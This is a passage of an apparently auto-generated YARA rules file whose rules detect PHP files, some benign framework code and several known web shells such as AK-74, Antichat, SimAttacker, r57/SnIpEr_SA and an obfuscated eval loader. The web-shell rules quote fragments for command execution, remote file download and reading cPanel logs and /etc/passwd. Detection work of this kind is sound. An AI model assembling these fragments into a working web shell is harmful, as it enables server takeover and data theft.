      date = "2019-02-23"
      hash1 = "75f1b7c245bfb5b1e83319586ebd01b3d2b18151b17bc6a379449e06ebbe9293"
   strings:
      $s1 = "Schema::create('user_profiles', function (Blueprint $table)" fullword ascii
      $s2 = "Schema::dropIfExists('user_profiles');" fullword ascii
      $s3 = "$table->text('description');" fullword ascii
      $s4 = "use Nova\\Database\\Migrations\\Migration;" fullword ascii
      $s5 = "class CreateUserProfilesTable extends Migration" fullword ascii
      $s6 = "use Nova\\Database\\Schema\\Blueprint;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule AK_74_Security_Team
{
   meta:
      description = "php17 - file AK-74_Security_Team.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "240e94bf8a28e2104c6aded0c7ffffd0ed3d5f34af20defac6db69abf08b1b32"
   strings:
      $x1 = "<b><font color=#830000>3.</font></b><font color=#830000> <b><font color=#830000>User</b></font> - '.( get_current_user()).' " fullword ascii
      $x2 = "$res .= '<form action=\"'.$xshell.'?act=execute\" method=\"post\"><input type=\"hidden\" name=\"action\" value=\"execute\">" fullword ascii
      $x3 = "<b><font color=#83000>Execute system commands!</font></b>" fullword ascii
      $x4 = "<b><font color=#830000>7. Your IP - </font></b><font color=#830000>'.(getenv('REMOTE_ADDR')).'</font><br><br>" fullword ascii
      $s5 = "<b><font color=#830000>4. Server Software - </font></b><font color=#830000>'.(getenv('SERVER_SOFTWARE')).'</font><br><br>" fullword ascii
      $s6 = "<tr><td align=center><b><font color=#83000>Copyright </font><a href=\"http://ak74-team.net\" target=\"_blank\">AK-74 Security Te" ascii
      $s7 = "$res .= '<tr><td align=center><b><font color=#83000>Copyright </font><a href=\"http://ak74-team.net\" target=\"_blank\">AK-74 Se" ascii
      $s8 = "<b><font color=#830000>5. Request Method - </font></b><font color=#830000>'.(getenv('REQUEST_METHOD')).'</font><br><br>" fullword ascii
      $s9 = "if (!move_uploaded_file($_FILES['filename']['tmp_name'],$_SESSION['currentdir'].'/'.$_POST['filename2']))" fullword ascii
      $s10 = "<b><font color=#830000>6. Server IP - </font></b><font color=#830000>'.(getenv('SERVER_ADDR')).'</font><br><br>" fullword ascii
      $s11 = "$content .= $shell->downloadfile($_GET['file']);" fullword ascii
      $s12 = "$res .= '<form action=\"'.$xshell.'?act=filemanager\" method=\"post\"><input type=\"hidden\" name=\"action\" value=\"chmod\">'" fullword ascii
      $s13 = "$res .= '<form action=\"'.$xshell.'?act=exesys\" method=\"post\"><input type=\"hidden\" name=\"action\" value=\"exesys\">" fullword ascii
      $s14 = "<a href=\"'.$xshell.'?act=phpinfo\" target=\"_blank\">phpinfo()</a>" fullword ascii
      $s15 = "if (!copy($_FILES['filename']['tmp_name'],$_SESSION['currentdir'].'/'.$_POST['filename2']))" fullword ascii
      $s16 = "ty Team<a> <font color=#83000>2005 - '.date(\"Y\").'</font></b></td></tr>';" fullword ascii
      $s17 = "$content .= $shell->editfileform($_GET['file']);" fullword ascii
      $s18 = "$res .= '<html><head><title>AK-74 Security Team Web Shell</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=" ascii
      $s19 = "$res .= '<html><head><title>AK-74 Security Team Web Shell</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=" ascii
      $s20 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'.(getenv('HTTP_X_FORWARDED_FOR')).'</font><br><br" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule approvalAccepted
{
   meta:
      description = "php17 - file approvalAccepted.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "11c3911e8de3d1bf12598aa0561e707c6a77b663d0d6ea5eacab6fdbb1daa743"
   strings:
      $s1 = "* @license https://www.humhub.com/licences" fullword ascii
      $s2 = "/* @var contentContainer \\humhub\\modules\\content\\components\\ContentContainerActiveRecord */" fullword ascii
      $s3 = "<td width=\"50\"><?= \\humhub\\widgets\\mails\\MailContentContainerImage::widget(['container' => $space])?></td>" fullword ascii
      $s4 = "<td width=\"50\"><?= \\humhub\\widgets\\mails\\MailContentContainerImage::widget(['container' => $originator])?></td>" fullword ascii
      $s5 = "<td width=\"50\"><?= \\humhub\\widgets\\mails\\MailContentContainerImage::widget(['container' => $originator])" fullword ascii
      $s6 = "<td width=\"50\"><?= \\humhub\\widgets\\mails\\MailContentContainerImage::widget(['container' => $space])?></t" fullword ascii
      $s7 = "* @link https://www.humhub.org/" fullword ascii
      $s8 = "<td width=\"25\"><img src=\"<?= \\yii\\helpers\\Url::to('@web-static/img/mail_ico_check.png', true); ?>\" /></td>" fullword ascii
      $s9 = "* @copyright Copyright (c) 2017 HumHub GmbH & Co. KG" fullword ascii
      $s10 = "humhub\\widgets\\mails\\MailButton::widget(['url' => $url, 'text' => Yii::t('SpaceModule.notifications_mails', 'View Online')])" fullword ascii
      $s11 = "<td width=\"25\"><img src=\"<?= \\yii\\helpers\\Url::to('@web-static/img/mail_ico_check.png', true); ?>\" /></t" fullword ascii
      $s12 = "\\humhub\\widgets\\mails\\MailButtonList::widget(['buttons' => [" fullword ascii
      $s13 = "/* @var $originator \\humhub\\modules\\user\\models\\User */" fullword ascii
      $s14 = "<?php $this->beginContent('@notification/views/layouts/mail.php', $_params_); ?>" fullword ascii
      $s15 = "humhub\\widgets\\mails\\MailButton::widget(['url' => $url, 'text' => Yii::t('SpaceModule.notifications_mail" fullword ascii
      $s16 = "<td style=\"font-size: 14px; line-height: 22px; font-family:Open Sans,Arial,Tahoma, Helvetica, sans-serif; color:#555" fullword ascii
      $s17 = "/* @var space humhub\\modules\\space\\models\\Space */" fullword ascii
      $s18 = "/* @var $viewable humhub\\modules\\space\\notifications\\ApprovalRequestAccepted */" fullword ascii
      $s19 = "<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" align=\"left\">" fullword ascii
      $s20 = "<?php $this->endContent();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule AttachmentUnitTest
{
   meta:
      description = "php17 - file AttachmentUnitTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4212c538929ac54fe9aace3261246c97373cb9297945e1d95f2ce518c712b3a7"
   strings:
      $s1 = "$this->assertEquals($this->file->grabFile(), $attachment->getContent());" fullword ascii
      $s2 = "$this->assertEquals($this->attachment['content'], $attachment->getContent());" fullword ascii
      $s3 = "_elgg_services()->logger->enable();" fullword ascii
      $s4 = "_elgg_services()->logger->disable();" fullword ascii
      $s5 = "$this->assertEquals($this->file->getMimeType(), $attachment->getType());" fullword ascii
      $s6 = "$this->assertEquals($this->file->getFilename(), $attachment->getFileName());" fullword ascii
      $s7 = "$this->assertEquals($this->attachment['filename'], $attachment->getFileName());" fullword ascii
      $s8 = "$this->assertEquals('attachment', $attachment->getDisposition());" fullword ascii
      $s9 = "$this->assertEquals($this->attachment['type'], $attachment->getType());" fullword ascii
      $s10 = "* @group EmailService" fullword ascii
      $s11 = "$invalid_file->setFilename('foobar2.txt');" fullword ascii
      $s12 = "$file->setFilename('foobar.txt');" fullword ascii
      $s13 = "* @var \\ElggFile" fullword ascii
      $s14 = "'filename' => 'text.txt'," fullword ascii
      $s15 = "* @group UnitTests" fullword ascii
      $s16 = "'content' => 'Test file content'," fullword ascii
      $s17 = "unset($invalid_array['content']);" fullword ascii
      $s18 = "$attachment = Attachment::factory($invalid_array);" fullword ascii
      $s19 = "$attachment = Attachment::factory($this->attachment);" fullword ascii
      $s20 = "$attachment = Attachment::fromElggFile($this->file);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule sig_5aa6b1fb87480c5700151b72e9a72b7a
{
   meta:
      description = "php17 - file 5aa6b1fb87480c5700151b72e9a72b7a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "78dd315eb09552f6c67eff132b6a662d99b311be83e728b19eca796cf6af884f"
   strings:
      $x1 = "* @copyright   Copyright (c) 2012 Magento Inc. (http://www.magentocommerce.com)" fullword ascii
      $x2 = "* @author     Magento Core Team <core@magentocommerce.com>" fullword ascii
      $s3 = "$pageId = Mage::getStoreConfig(Mage_Cms_Helper_Page::XML_PATH_NO_COOKIES_PAGE);" fullword ascii
      $s4 = "* Used if no cookies page don't configure or available" fullword ascii
      $s5 = "* Default index action (with 404 Not Found headers)" fullword ascii
      $s6 = "$pageId = Mage::getStoreConfig(Mage_Cms_Helper_Page::XML_PATH_NO_ROUTE_PAGE);" fullword ascii
      $s7 = "$pageId = Mage::getStoreConfig(Mage_Cms_Helper_Page::XML_PATH_HOME_PAGE);" fullword ascii
      $s8 = "* Used if no route page don't configure or available" fullword ascii
      $s9 = "* Used if default page don't configure or available" fullword ascii
      $s10 = "$this->getResponse()->setHeader('HTTP/1.1','404 Not Found');" fullword ascii
      $s11 = "* Default no cookies page action" fullword ascii
      $s12 = "* Render Disable cookies page" fullword ascii
      $s13 = "$this->_forward('defaultNoCookies');;" fullword ascii
      $s14 = "$this->getResponse()->setHeader('Status','404 File not found');" fullword ascii
      $s15 = "* @param string $coreRoute" fullword ascii
      $s16 = "* Render CMS 404 Not found page" fullword ascii
      $s17 = "* Default no route page action" fullword ascii
      $s18 = "* Renders CMS Home page" fullword ascii
      $s19 = "* Cms index controller" fullword ascii
      $s20 = "$this->_forward('defaultIndex');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule sig_387dd602d5fe0192968d4798b87841e47d854e27
{
   meta:
      description = "php17 - file 387dd602d5fe0192968d4798b87841e47d854e27.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8c476a6b67fdba2ddbc25daacc6b316daccd91206750419e7080c95f4b41d817"
   strings:
      $s1 = "echo \"<br>Connect back Shell , bypass Firewalls<br>" fullword ascii
      $s2 = "echo \"<br><center><h3> CMD ExeCute </h3></center>\" ;" fullword ascii
      $s3 = "echo \"<br><center><h3> Fake Mail- DOS E-mail By Victim Server </h3></center>\" ;" fullword ascii
      $s4 = "//fake mail = Use victim server 4 DOS - fake mail " fullword ascii
      $s5 = "echo \"<a href='?id=fm&fdownload=$dir$file'><span style='text-decoration: none'><font size='2' color='#008000'>download\";" fullword ascii
      $s6 = "CMD</font></span></a><font face=\"Tahoma\" size=\"2\"> Shell</font></b></p>" fullword ascii
      $s7 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword ascii
      $s8 = "<title>SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend </title>" fullword ascii
      $s9 = "//Connect Back -Firewall Bypass" fullword ascii
      $s10 = "header(\"Content-Disposition: attachment; filename=$entrypath\");" fullword ascii
      $s11 = "echo \"<script language='javascript'> alert('Sending Mail - please waite ...')</script>\";" fullword ascii
      $s12 = "$result=shell_exec(\"$cmd\");" fullword ascii
      $s13 = "if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {" fullword ascii
      $s14 = "//cmd-command line" fullword ascii
      $s15 = "&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM <br>" fullword ascii
      $s16 = "header(\"Content-Length: \" . filesize($name));" fullword ascii
      $s17 = "echo \"<script language='javascript'> alert('\\:D Successfully uploaded.!')</script>\";" fullword ascii
      $s18 = "<span style=\"text-decoration: none\"><font color=\"#000000\">File Manager</font></span></a></font></span></font></b></p>" fullword ascii
      $s19 = "(e,o2);if(h3==0x40)d[c/4]=String.fromCharCode(e)}plain=d.join('');return b?Utf8.decode(plain):plain};" fullword ascii
      $s20 = "echo \"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><font size='2' color='#999999'>Chmod\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

rule sig_04025959b191f8f9de3f924f0940515f
{
   meta:
      description = "php17 - file 04025959b191f8f9de3f924f0940515f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5916525af28ec268daed30e0bb38e97d3509f54a015be7f240ba5b0a3bb08267"
   strings:
      $x1 = "delm(\"# Execute Commands #\");print \"<table bgcolor=#2A2A2A style=\\\"border:2px solid black\\\" width=100% height=18%>\";" fullword ascii
      $x2 = "elseif(!function_exists(popen)){ ob_start();system($ocmd);$nval=ob_get_contents();ob_clean();}elseif(!function_exists(system)){" fullword ascii
      $x3 = "print $st.$c1.\"<div><b><center>Execute useful commands</div>\";" fullword ascii
      $x4 = "if(strstr(php_os,\"WIN\")){$epath=\"cmd.exe\";}else{$epath=\"/bin/sh\";}" fullword ascii
      $s5 = "ob_start();system($cmnd);$sret = ob_get_contents();ob_clean();print htmlspecialchars($sret);}elseif(!function_exists(system)){" fullword ascii
      $s6 = "$obj=new upload($HTTP_POST_FILES['upfile']['name'],$HTTP_POST_FILES['upfile']['tmp_name']); if (isset ($_REQUEST['ustsub'])){" fullword ascii
      $s7 = "print \" - <a target='_blank' href=\".inclink('dlink', 'phpinfo').\">phpinfo</a>\";" fullword ascii
      $s8 = "<option value='op0'>Execute quick commands</option>" fullword ascii
      $s9 = "print \\$sock \\\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\n\\\";" fullword ascii
      $s10 = "print \"<center><div><b>Enter the command to execute\";print $ec;" fullword ascii
      $s11 = "$owhich){if(function_exists(exec)){$nval=exec($ocmd);}elseif(!function_exists(exec)){$nval=shell_exec($ocmd);}" fullword ascii
      $s12 = "input(\"submit\",\"\",\"Execute\",\"\");print \"</center>\".$ef.$ec.$et.\"</div></td>\";" fullword ascii
      $s13 = "if ($_REQUEST['uscmnds']=='op3'){callfuncs('cat /var/cpanel/accounting.log');}" fullword ascii
      $s14 = "ob_start();passthru($ocmd);$nval=ob_get_contents();ob_clean();}" fullword ascii
      $s15 = "print \" - <a href=\".inclink('dlink', 'cmdhlp').\"&scdir=$nscdir>Cmd help</a>\";" fullword ascii
      $s16 = "print\"<center>Copyright is reserved to KingDefacer<br>[  By Turkish Security GROUP Go to : <a target='_blank' href='http://altu" ascii
      $s17 = "if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])){print \"<div><b><center>[ Executed command ][$] : \".$_REQUEST['cmd']." ascii
      $s18 = "if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])){print \"<div><b><center>[ Executed command ][$] : \".$_REQUEST['cmd']." ascii
      $s19 = "print $st.$c1.\"<div><b><center>Execute php code with eval()</div>\";" fullword ascii
      $s20 = "print \"<p><b>: Insert the command below to get help or to know more about it's uses :\";print \"<form method=get>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_9077eb05f4ce19c31c93c2421430dd3068a37f17
{
   meta:
      description = "php17 - file 9077eb05f4ce19c31c93c2421430dd3068a37f17.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b9800538721367a9770984d637d8d20946c02537d76c86965e532c08e2242251"
   strings:
      $s1 = "echo shell_exec($_POST['command']);" fullword ascii
      $s2 = "AAAAAAAAAAAAAAB" ascii
      $s3 = "$file=@fopen($_FILES['userfile']['tmp_name'],\"r\") or die (\"[-]Error reading file!\");" fullword ascii
      $s4 = "<form action=<?php echo $surl ?>?&<?php echo $word ?>&exec_st method=\"post\">" fullword ascii
      $s5 = "<form action=<?php echo $surl ?>&<?php echo $word ?>&exec method=\"post\">" fullword ascii
      $s6 = "mkdir(urldecode($_POST['dir']).\"/\".$_POST['name']) or die (\"[-]Error creating dir!\");" fullword ascii
      $s7 = "if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir .\"/\". $_FILES['userfile']['name'])) {" fullword ascii
      $s8 = "echo \"</a></td><td><a href=\".$surl.\"&\".$word.\"&download&file_browser&file=\".urlencode($j_d).\"/\".urlencode($file).\">\";" fullword ascii
      $s9 = "<input type=\"submit\" name=\"sub\" value=\"Execute\"><br>" fullword ascii
      $s10 = "unlink(urldecode($dir).\"/\".$file) or die (\"[-]Error @ file:\".$file.\"\");" fullword ascii
      $s11 = "echo \"</textarea><br><br><input type=hidden name=file value=\".urlencode($_GET['file']).\"><input type=submit name=sub valu" fullword ascii
      $s12 = "<form enctype=\"multipart/form-data\" action=<?php echo $surl ?>&<?php echo $word ?>&upload method=\"post\">" fullword ascii
      $s13 = "By turning \"on\" safe you can make your shell in 404 Not Find mode if the user doesnt know your OWN set word!" fullword ascii
      $s14 = "<form action=<?php echo $surl ?>?&<?php echo $word ?>&special_d&file=<?php echo urlencode($filename) ?> method=post>" fullword ascii
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZGVzYwAAAAAAAAAuSUVDIDYxOTY2LTIuMSBEZWZhdWx0" fullword ascii
      $s16 = "<form enctype=\"multipart/form-data\" action=<?php echo $surl ?>&<?php echo $word ?>&special_crypt method=\"post\">" fullword ascii
      $s17 = "LFJlZmVyZW5jZSBWaWV3aW5nIENvbmRpdGlvbiBpbiBJRUM2MTk2Ni0yLjEAAAAAAAAAAAAAACxS" fullword ascii
      $s18 = "ZWZlcmVuY2UgVmlld2luZyBDb25kaXRpb24gaW4gSUVDNjE5NjYtMi4xAAAAAAAAAAAAAAAAAAAA" fullword ascii
      $s19 = "AABDb3B5cmlnaHQgKGMpIDE5OTggSGV3bGV0dC1QYWNrYXJkIENvbXBhbnkAAGRlc2MAAAAAAAAA" fullword ascii
      $s20 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule a06f645bd9faa6f9067e2dfd70fc39558ebc61f7
{
   meta:
      description = "php17 - file a06f645bd9faa6f9067e2dfd70fc39558ebc61f7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "196f3b55a293f0cc381b3a427fe743f7ea93faaf7b8d421beb420c52fc05e6df"
   strings:
      $s1 = "echo \"( ) <a href=?file=\" . $fichero . \"/\" . $filename . \">\" . $filename . \"</a><br>\";" fullword ascii
      $s2 = "$fichero=$_GET['file']; " fullword ascii
      $s3 = "$buffer = fread($fp, filesize($fichero));" fullword ascii
      $s4 = "while($filename = readdir($handle)) {" fullword ascii
      $s5 = "if($_GET['file']) {" fullword ascii
      $s6 = "// by: The Dark Raver" fullword ascii
      $s7 = "// list.php = Directory & File Listing" fullword ascii
      $s8 = "echo \"FILE: \" . $fichero . \"<br><hr><pre>\";" fullword ascii
      $s9 = "if($handle = @opendir($fichero)) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_8d851537dff4dc80cdc23f57784bbf0bd7b4431c
{
   meta:
      description = "php17 - file 8d851537dff4dc80cdc23f57784bbf0bd7b4431c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f27b491508d18cbfb6f3e57aafcabe5826a2f0098b187ad6459f40b5812c36e0"
   strings:
      $s1 = "@readfile (\"http://127.0.0.1/r57shell_version/version.php?version=\".$current_version.\"\");}}" fullword ascii
      $s2 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; " fullword ascii
      $s3 = "$this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode(\"`, `\", $this->columns).'`) VALUES (\\''.@implode(\"', '\", $thi" fullword ascii
      $s4 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s5 = "$this->dump[] = 'INSERT INTO '.$table.' ('.@implode(\", \", $this->columns).') VALUES (\\''.@implode(\"', '\", $this->row" fullword ascii
      $s6 = "/*  SnIpEr_SA.php - ?????? ?? ??? ??????????? ??? ????????? ????????? ??????? ?? ??????? ????? ???????" fullword ascii
      $s7 = "if(empty($_POST['subj'])) { $_POST['subj'] = 'file from SnIpEr_SA shell'; }" fullword ascii
      $s8 = "'ru_text99'=>'* ? ???????? ?????? ? ?????? ???????????? ??? ???????????? ?? /etc/passwd'," fullword ascii
      $s9 = "/*  ?? SnIpEr.SA@hotmail.com ??? ??????????? ????? ???????????." fullword ascii
      $s10 = "if(!$file=@fopen($_POST['loc_file'],\"r\")) { err(1,$_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $s11 = "echo '<tr><td>'.ws(3).'<div align=center><font face=tahoma size=-2><b> --- </b></font></div></td></tr>';" fullword ascii
      $s12 = "if(!$file=@fopen($_POST['d_name'],\"r\")) { err(1,$_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s13 = "if(!$file=@fopen($_POST['e_name'],\"r\")) { err(1,$_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s14 = "if(rmdir($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#2279D9><tr><td bgcolor=#000000><" fullword ascii
      $s15 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#2279D9><tr><td bgcolor=#000000" fullword ascii
      $s16 = "'=>'cat /var/cpanel/accounting.log'," fullword ascii
      $s17 = "service.pwd'=>'find / -type f -name service.pwd'," fullword ascii
      $s18 = "config.inc.php'=>'find / -type f -name config.inc.php'," fullword ascii
      $s19 = "'ru_text101'=>'???????????? ????? ???????????? (user -> resu) ??? ???????????? ? ???????? ??????'," fullword ascii
      $s20 = "OM user;\")).\"</textarea><br><input type=submit name=submit value=\\\" Run SQL query \\\"></div><br><br>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule Antichat_Shell_Modified_by_Go0o
{
   meta:
      description = "php17 - file Antichat_Shell_Modified_by_Go0o.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cdd96e4dcce2cd8c3156108eec776d5c40879fb01b0ea80dfa190e8f3e51cb05"
   strings:
      $x1 = "?><?php $header;?><table width=\"100%\" bgcolor=\"#31333b\"  align=\"right\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\"><t" ascii
      $x2 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$ret = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x3 = "elseif(function_exists('system')){@ob_start();@system($cmd);$ret = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x4 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text/h" ascii
      $x5 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><meta http-equiv=\"Content-Type\" content=\"text/h" ascii
      $s6 = "$content.=(!empty($_POST['dif_name'])?($_POST['dif_name']):(\"dump.sql\"));" fullword ascii
      $s7 = "$content.=(!empty($_POST['mysql_p'])?($_POST['mysql_p']):(\"password\"));" fullword ascii
      $s8 = "case fetch:shell(which('fetch').\" -o \".$_POST['filename'].\" -p \".$_POST['urldown'].\"\");break;" fullword ascii
      $s9 = "case curl:shell(which('curl').\" \".$_POST['urldown'].\" -o \".$_POST['filename'].\"\");break;" fullword ascii
      $s10 = "$serv = @mysql_connect(\"$adress:$port\", \"$login\", \"$pass\") or die(\"" fullword ascii
      $s11 = ": $cfa[0]<form name='mysql_dump' action='$php_self' method='post'>" fullword ascii
      $s12 = "$content.=\"<form name='dump1' action='$php_self' method='POST'>" fullword ascii
      $s13 = "$content.=\"<form name='dump2' action='$php_self' method='post'>" fullword ascii
      $s14 = "$content.=\"<form name='mysql_dump' action='$php_self' method='post'>" fullword ascii
      $s15 = "$content=\"<table><form action='$php_self' method=post name=md5><tr><td><b>Decrypte MD5</b>" fullword ascii
      $s16 = "$content.=(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):(\"user\"));" fullword ascii
      $s17 = "case lynx:shell(which('lynx').\" -source \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");break;" fullword ascii
      $s18 = "case links:shell(which('links').\" -source \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");break;" fullword ascii
      $s19 = "elseif(@is_resource($f = @popen($cmd,\"r\"))){$ret = \"\";while(!@feof($f)) { $ret .= @fread($f,1024); }@pclose($f);}" fullword ascii
      $s20 = "if(function_exists('exec')){@exec($cmd,$ret);$ret = join(\"\\n\",$ret);}" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule _searchForm
{
   meta:
      description = "php17 - file _searchForm.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "644f6ba15312afe00418a7d18ea7c4dc00cb90cd31182d56b957250eb87ca3a8"
   strings:
      $s1 = "* @var $model \\app\\modules\\data\\models\\ImportModel" fullword ascii
      $s2 = "<?= \\app\\backend\\widgets\\filterForm\\filterFormFields::widget(['objectId' => $object->id]) ?>" fullword ascii
      $s3 = "<?= \\app\\backend\\widgets\\filterForm\\filterFormProperty::widget(['objectId' => $object->id]) ?>" fullword ascii
      $s4 = "* @var $object \\app\\models\\Object;" fullword ascii
      $s5 = "if ($object->id == Object::getForClass(get_class($product))->id) {" fullword ascii
      $s6 = "echo \\app\\backend\\widgets\\filterForm\\filterFormCategory::widget();" fullword ascii
      $s7 = "$product = Yii::$container->get(Product::class);" fullword ascii
      $s8 = "use \\app\\modules\\shop\\models\\Product;" fullword ascii
      $s9 = "<legend><?= Yii::t('app', 'Filter') ?></legend>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule AssignmentInterface
{
   meta:
      description = "php17 - file AssignmentInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b69ed0dfdb6240f9f448ed327130c3fd128a0f0a997615185e3b6d0b6e1dbf97"
   strings:
      $s1 = "* @return RegistryInterface" fullword ascii
      $s2 = "* @return EntrySubjectInterface" fullword ascii
      $s3 = "use Concrete\\Core\\Permission\\Registry\\Entry\\EntrySubjectInterface;" fullword ascii
      $s4 = "use Concrete\\Core\\Permission\\Registry\\Entry\\EntryInterface;" fullword ascii
      $s5 = "function getEntry();" fullword ascii
      $s6 = "function getRegistry();" fullword ascii
      $s7 = "namespace Concrete\\Core\\Permission\\Registry;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_03afdbd66e7929b125f8597834fa83a4
{
   meta:
      description = "php17 - file 03afdbd66e7929b125f8597834fa83a4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8059af681e101849e8016cf8bdf9c85229be5a9e1ba8ae5a3be1661041154d53"
   strings:
      $s1 = "$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";$jak3fr0z=$func('$x','ev'.'al'.'(\"?>\".gz'.'in'.'fla'.'te(ba'.'se'.'64'.'_de'.'co" ascii
      $s2 = "https://github.com/PhilCodEx/jak3fr0z" fullword ascii
      $s3 = "$GLOBALS['pass'] = \"e25044e2e06364d6387bf080bdbba9bc2f0fd260\"; // sha1(md5(pass))" fullword ascii
      $s4 = "4f01sT7DvOAzpzLCe5ucdCPylXb11xulSbVlTBnZ0t3UGrvilg7FE/nSxat/D/Nlql+ODLD56YEJ4U+IHr7AeAXtZCXa4FuPg4Jid0Lfqim34G6syLBJtirCrJWLVjmV" ascii
      $s5 = "UFqRzBufQzG+rmLtTbjZMrQ+sPU/4H+9gL7dtLPX963AB5V0N3+X4WDppXXdGDZ1nSvToXSuPsrqJfig0ge8FiqloGfC/U/s4rnJ+/897mpXN/emYG/nR+aUWRWg5okf" ascii
      $s6 = "/ggYQCWNlkatRJh1nZSsUmZLSCdW4l0M2Zd09fo9xr90B3OTsThvVsimW/b7xF4ImDlZcDk2LAvcqF89U6qNWYYI8GWsweArDLLoR5m6/9tunn7W3O7z3S3cp8zqmAMd" ascii
      $s7 = "+tC1T2/brQ6vfrQvHv14VixbpOQhiCnpbUswfrH5f/XnNmwRM1YvBNMm72DS/pYEoax9Riz/d7TGeTp5WQ9AND8Wp6kgJMfeNQsEoeW48fHgfwnxH8pwv/mcF/xvAfCv" ascii
      $s8 = "l45bPQxNz9ffPG3isu7qtHZH7Eu33z+sxJhSnQIsMjB/AcmZpKsjNDFaT4pRFeIeVDVua213MvKMx6cdPqPiGOm7ydkjutz990KdL2vA9ugyXdlL9p2ksdeEV4/nTpDR" ascii
      $s9 = "KLstkzhwlaMDS1584nBagEtRPx04kjibLb7G7smg9UCLa5UTtPWwCTsFDrJMi8TMAbt6tgf9g3vr7f3I7A/uLM2udWNRx0pEw6XefTmgmRQ7BwoeMV8kboqBFZVxHGJm" ascii
      $s10 = "uGCex2ZsCP10tl4O2xMhoIzC4RkIDBOByhmeAgbBhLlnnXWYu1dZtrchWhMq6LgEttxK43B7VKTe14rNycTzSrE9fFvRGy9AE9yMG6fGx1CJ6bNZ3lgqztIm2+l4eH3Z" ascii
      $s11 = "QuK4NVy68nKLUbgLDp4FMG0FjYBrlwiW82hdwi2R3cBlX0bV4KLEHovD0czfPzkI6GYSU3n1s4sOpIQ59MiiH0pr4ZWnRF8X5sn7/Rb2FuYTc0z5aPgeTGB5KvdsjAwN" ascii
      $s12 = "aP6eSJGetNgTqefJw5d7JSjiw8dXLVGQU5cP3UkXZ+euz8Aiec4oW4r7nTuSgAzk1mYSg6WU/fQCmlNGmnd8RBseJicKL1w4mHPlyxy4crpvhQejZk5yqhggeXmQDGwb" ascii
      $s13 = "wdO4GHTJdxFIRcwrfeWqG+gx0WxHySX9M9MFBiuo9OSNinuFcrQM/MHbAe5LbDbCwRNufJP/vLxXkfWOk2Gnc9jZ686tJ0Dguga0Pte40s4uJ2tmjNOuw2KgYtFzDhkX" ascii
